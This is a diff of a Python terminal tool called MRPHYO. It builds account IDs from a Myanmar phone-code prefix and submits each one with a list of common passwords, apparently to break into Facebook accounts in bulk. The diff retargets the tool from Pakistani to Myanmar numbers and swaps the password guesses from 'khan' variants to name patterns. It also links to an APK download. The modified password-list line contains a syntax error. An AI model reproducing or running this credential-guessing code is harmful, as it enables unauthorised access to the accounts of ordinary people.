@@ -57,15 +57,15 @@ logo=("""\033[1;37m
 \033[1;36m |_|  |_|_|  \_\_|    |_|  |_|  |_|  \____/ 
                                             
                                             
-{♥} Hello Myanmar {❤}
+\033[1;32m{♥} Hello Myanmar {❤}
 ----------------------------------------------
-{√} Author    :\033[1;31m WAI LINN KHAING
-{√} Tool Name :\033[1;31m MRPHYO
-{√} Type type :\033[1;31m Free
-{√} Version   :\033[1;31m 0.0.1
-\033[1;37m----------------------------------------------""")
+\033[1;32m{❤} Author    : WAI LINN KHAING
+\033[1;32m{❤} Tool Name : MRPHYO
+\033[1;32m{❤} Type type : Free
+\033[1;32m{❤} Version   : 0.0.1
+\033[1;32m\033[1;37m----------------------------------------------""")
 def linex():
-        print('\033[1;37m----------------------------------------------')
+        print('\033[1;32m----------------------------------------------')
 def clear():
         os.system('clear')
         print(logo)
@@ -302,7 +302,7 @@ def menu():
                         elif xd in ['7','07']:
                                 os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/MRPHYO_VPN1.0.apk/file');menu()
                         elif xd in ['8','08']:
-                                os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
+                                os.system('xdg-open https://m.facebook.com/story.php?story_fbid=pfbid0WbrJZNjSzXzAujZqAESzPr4HYBXrWwjHDZbepAMkBhSRakGv4KHC1jiSmFbjWWKQl&id=100010643201344=fbl');menu()
                         elif xd in ['0','00']:
                                 exit(' Thanks for use 🥰 ')
                         else:
@@ -336,7 +336,7 @@ def menu():
 def pak():
                 user=[]
                 clear()
-                print('\033[1;31m Code example: 0306,0315,0335,0345')
+                print('\033[1;31m Code example: 0967,0996,0925,0977')
                 code = input('\033[1;37m put code: ')
                 try:
                         limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
@@ -354,7 +354,7 @@ def pak():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
+                                passlist = [psx,ids,'First Last','FirstLast','First12345','First1234','First123','firstlast','first123','first1234','first last',first12345'']
                                 MRPHYO.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
